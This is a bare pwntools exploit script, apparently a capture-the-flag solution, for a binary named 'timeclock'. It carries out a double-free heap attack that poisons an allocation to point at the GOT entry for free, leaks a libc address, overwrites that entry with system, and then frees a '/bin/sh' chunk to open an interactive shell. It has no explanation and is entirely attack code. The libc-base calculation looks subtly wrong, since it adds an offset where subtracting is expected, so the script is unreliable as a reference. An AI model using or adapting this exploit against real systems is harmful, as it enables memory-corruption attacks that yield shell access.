from pwn import *

e = ELF("./timeclock")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path,
  )

def alloc(first_name, last_name):
  p.sendline("1")
  p.sendlineafter(">", first_name)
  p.sendlineafter(">", last_name)

  p.recvuntil(">")

def free(idx):
  p.sendline("2")
  p.sendlineafter(">", str(idx))

  p.recvuntil(">")

p.recvuntil(">")

alloc("A" * 0x30, "A" * 0x30)
free(0)
free(0)

alloc(p64(e.got["free"]), "A" * 0x30)

p.sendline("4")
p.sendlineafter(">", "0")
p.recvuntil("First name: ")

gdb.attach(p)
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) + libc.symbols["free"]
print("Libc Base: {:#x}".format(leak))

p.recvuntil(">")

p.sendline("3")
p.sendlineafter(">", "1")
p.sendlineafter(">", p64(leak + libc.symbols["system"]))
p.sendlineafter(">", "/bin/sh")

p.recvuntil(">")

p.sendline("2")
p.sendlineafter(">", "1")

p.interactive()